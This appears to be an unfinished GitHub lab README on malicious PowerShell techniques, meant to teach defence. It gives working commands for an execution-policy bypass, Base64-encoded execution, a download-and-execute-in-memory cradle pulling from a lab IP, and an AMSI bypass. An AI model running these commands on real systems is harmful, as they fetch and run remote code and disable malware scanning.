# Scenario 

This attack falls into the execution phase of Mitre Att&ck and requires initial access to the victim machine via phishing, credential dumping or other methods. This scenario demonstrates the different techniques and tactics attackers use when using powershell maliciously and details the common misconfigurtions that allow these attacks to take place and best practices to secure your network
from malicious powershell use.

# Setup
# Attack Types
1. **Local Powershell script Execution**
   Attacker runs a script that is hosted locally
   Proof of concept: `powershell -ExecutionPolicy Bypass -File .\script.ps1`
   <img width="702" height="389" alt="image" src="https://github.com/user-attachments/assets/970d2cc5-124b-43e6-8074-357a558b6013" />

2. **Base64 Encoded Command**
   Attackers use Base64-encoded PowerShell commands primarily to:
   - Hide what the code is doing
   - Avoid detection by AV/EDR.
   - Bypass restrictions or logging.
   - Execute commands more reliably in remote or automated contexts.
  Proof of concept: `powershell -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAaABlAGwAbABvACwAIABXAG8AcgBsAGQAIQAiAAoA`
<img width="860" height="54" alt="image" src="https://github.com/user-attachments/assets/081d264b-6284-4d82-a8e4-ea73c19cbd4a" />


  From this point the commands will be base64 encoded due to the prolific use in attacks. All commands will be executed in the same manner

3. **Download payload to disk for later use**
   Attacker will download payloads and malware for further staging and save them to disk so they can be ran later.
   <img width="849" height="437" alt="image" src="https://github.com/user-attachments/assets/ae623c89-9e75-4b62-883a-629145674136" />

   Proof of concept: `$Text = 'Invoke-WebRequest -Uri "http://192.168.1.105:8080/script.ps1" -OutFile "script.ps1"'`
   
4. **Download and Execute in Memory**
   Attackers will download scripts using the Invoke_WebRequest expression which is passed to Invoke-Expression which will execute the
   script in memory never writing any files to disk. This allows attackers to run commands and deliver full malware capabilities
   including c2 beacons.
   Proof of Concept: `$Text = "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'http://192.168.1.105/script.ps1')"`
   <img width="851" height="717" alt="image" src="https://github.com/user-attachments/assets/54252204-a5ff-497c-a8e5-662fca9d29ad" />
5. AMSI Bypass
   Attackers 

   Proof of concept: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show('AMSI bypass simulated.')
`

  
